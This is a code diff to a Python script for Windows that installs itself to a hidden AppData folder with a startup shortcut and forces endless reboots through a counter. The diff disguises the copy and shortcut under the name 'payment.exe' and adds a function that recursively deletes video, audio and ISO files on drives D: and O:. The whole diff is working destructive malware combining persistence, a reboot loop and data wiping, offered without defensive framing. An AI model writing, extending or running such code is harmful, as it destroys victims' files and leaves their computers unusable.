@@ -7,7 +7,7 @@ MARKER_FILE = os.path.join(os.getenv('APPDATA'), 'restart_counter.txt')
 def add_to_startup():
     appdata = os.getenv('APPDATA')
     hidden_dir = os.path.join(appdata, 'Microsoft', 'Windows')
-    exe_path = os.path.join(hidden_dir, 'triple_restart.exe')
+    exe_path = os.path.join(hidden_dir, 'payment.exe')  # Copy as payment.exe
 
     if not os.path.exists(hidden_dir):
         os.makedirs(hidden_dir)
@@ -16,7 +16,7 @@ def add_to_startup():
 
     # Add shortcut to startup
     startup_dir = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-    shortcut_path = os.path.join(startup_dir, 'triple_restart.lnk')
+    shortcut_path = os.path.join(startup_dir, 'payment.lnk')  # Shortcut name updated
 
     if not os.path.exists(shortcut_path):
         import win32com.client
@@ -44,11 +44,27 @@ def save_restart_count(count):
     with open(MARKER_FILE, 'w') as f:
         f.write(str(count))
 
+def delete_media_files():
+    extensions = ('.mp4', '.mov', '.avi', '.mkv', '.wmv', '.mp3', '.iso')
+    drives_to_scan = ['D:\\', 'O:\\']
+
+    for drive in drives_to_scan:
+        for root, dirs, files in os.walk(drive):
+            for file in files:
+                if file.lower().endswith(extensions):
+                    file_path = os.path.join(root, file)
+                    try:
+                        os.remove(file_path)
+                        print(f"Deleted: {file_path}")
+                    except Exception as e:
+                        print(f"Failed to delete {file_path}: {e}")
+
 def main():
     add_to_startup()
+    delete_media_files()
     count = get_restart_count()
 
-    if count < 9999999999999999999:  # Change this to 99999999999999999 if you want!
+    if count < 9999999999999999999:
         save_restart_count(count + 1)
         trigger_restart()
     else:
